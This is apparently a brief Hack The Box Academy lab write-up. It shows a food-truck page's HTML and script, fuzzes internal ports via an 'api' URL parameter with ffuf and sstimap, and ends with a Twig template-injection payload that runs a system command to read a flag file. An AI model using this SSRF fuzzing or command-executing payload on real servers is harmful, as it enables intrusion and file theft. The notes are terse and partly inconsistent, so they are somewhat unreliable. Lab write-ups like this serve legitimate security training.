# OBtain the flag:
```html
<!doctype html>
<html class="no-js" lang="en">
<head>
	<meta charset="utf-8">
	<title>Rogue Pickings</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta property="og:title" content="">
	<meta property="og:type" content="">
	<meta property="og:url" content="">
	<meta property="og:image" content="">
	<link rel="apple-touch-icon" href="icon.png">
	<!-- Place favicon.ico in the root directory -->

	<link rel="stylesheet" href="css/normalize.css">
	<link rel="stylesheet" href="css/main.css">
	<meta name="theme-color" content="#fafafa">
	<!-- google fonts -->
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Galada&family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
</head>

<body>
	<header>
		<div class="content-wrapper header-flex-container">
			<div class="name-plate">
				<h1>Flavor Fusion Express</h1>
			</div>
			<div class="navbar">
				<nav class="navbar-items">
					<li><a href="#menu">Menu</a></li>
					<li><a href="#reviews">Reviews</a></li>
					<li><a href="#contact">Contact</a></li>
				</nav>
			</div>
		</div>
	</header>
	<main>
	<section id="top-section">
		<div class="content-wrapper">
			<div class="main-image">
				<img id="main-img" src="img/green-bean.png" alt="green beans"/>
			</div>
			<div class="main-title">
				<h2>Welcome to our Food Truck <i>Flavor Fusion Express</i>!</h2>
				<p>Welcome to Flavor Fusion Express, the roaming truck bringing you the freshest ingredients and ideas in food. Our team works hard so you can be sure our ingredients are always fresh and picked carefully. Our menu changes every day and is made with you in mind. We can't wait to come to you! Check out our locations to see where you can find us.</p>
			</div>
		</div>
		<center><h2>Our Trucks' Locations</h2></center>
		<div class="content-wrapper bottom-section-flex-container">
			<div class="menu">
				<h3>FusionExpress01</h3>
				<p id="FusionExpress01">TODO</p>
			</div>
			<div class="reviews">
			<h3>FusionExpress02</h3>
				<p id="FusionExpress02">TODO</p>
			</div>
			<div class="contact">
			<h3>FusionExpress03</h3>
				<p id="FusionExpress03">TODO</p>
			</div>

	</section>
	<section id="bottom-section">
		<div class="content-wrapper bottom-section-flex-container">
			<div class="menu">
				<h3>Today's Specials</h3>
					<li>Flaming Hummus &amp; Falafel Salad</li>
					<li>Sizzling Bean Burritos</li>
					<li>Green Gloves Tamales</li>
			</div>
			<div class="reviews">
				<h3>Our Latest Review</h3>
				<p>“I got so excited about the yumminess of the falafel salad that I am typing this review as I inhale my lunch. Yes, the food is that good…”</p>
			</div>
			<div class="contact">
				<h3>Contact</h3>
				<address>
					<li>1001 Potrero Avenue</li>
					<li>San Francisco, CA 94110</li>
					<li><a href="tel:415206800">(415) 206-8000</a></li>
				</address>
			</div>
		</div>
	</section>
	</main>
	<footer>
		<div class="content-wrapper">
			<h4>Powered by lots of <span>fresh</span> ingredients.</h4>
		</div>
	</footer>

	<script src="js/vendor/modernizr-3.11.2.min.js"></script>
	<script src="js/plugins.js"></script>
	<script src="js/main.js"></script>

	<script>
		for (var truckID of ["FusionExpress01", "FusionExpress02", "FusionExpress03"]) {
			var xhr = new XMLHttpRequest();
			xhr.open('POST', '/', false);
			xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			xhr.onreadystatechange = function() {
				if (xhr.readyState === XMLHttpRequest.DONE) {
					var resp = document.getElementById(truckID)
					if (xhr.status === 200) {
						var responseData = xhr.responseText;
						var data = JSON.parse(responseData);

						if (data['error']) {
							resp.innerText = data['error'];
						} else {
							resp.innerText = data['location'];
						}
					} else {
						resp.innerText = "Unable to fetch current truck location!"
					}
				}
			};
			xhr.send('api=http://truckapi.htb/?id' + encodeURIComponent("=" + truckID));
		}
    </script>
</body>
</html>

```
We can see the most useful for get the flag is the script code:
```js
	for (var truckID of ["FusionExpress01", "FusionExpress02", "FusionExpress03"]) {
			var xhr = new XMLHttpRequest();
			xhr.open('POST', '/', false);
			xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			xhr.onreadystatechange = function() {
				if (xhr.readyState === XMLHttpRequest.DONE) {
					var resp = document.getElementById(truckID)
					if (xhr.status === 200) {
						var responseData = xhr.responseText;
						var data = JSON.parse(responseData);

						if (data['error']) {
							resp.innerText = data['error'];
						} else {
							resp.innerText = data['location'];
						}
					} else {
						resp.innerText = "Unable to fetch current truck location!"
					}
				}
			};
			xhr.send('api=http://truckapi.htb/?id' + encodeURIComponent("=" + truckID));

```
Try to see what happend on burp and try if has some SSlI `sstimap -u 'http://94.237.51.163:33044/index.php?name=test'` then interact with th repertater and see what happend:
![Burp](../Img/skill-ssti.png)

Before that we must tu enumerate with ffuf the port are opened:
`ffuf -u http://94.237.51.163:33044 -w Dictionaries/SecLists/Discovery/Infrastructure/common-http-ports.txt  -X POST -H “Content-Type: application/x-www-form-urlencoded” -d 'api=http://truckapi.htb/?id%3DFusionExpress01' -fr "Fail"`
And find the:
- 80
- 3360
Then we can use the payload of SSTI for get the flag:
`api=http://truckapi.htb/?id%3D{{['cat\x20../../../flag.txt']|filter('system')}}`


https://academy.hackthebox.com/achievement/349590/145
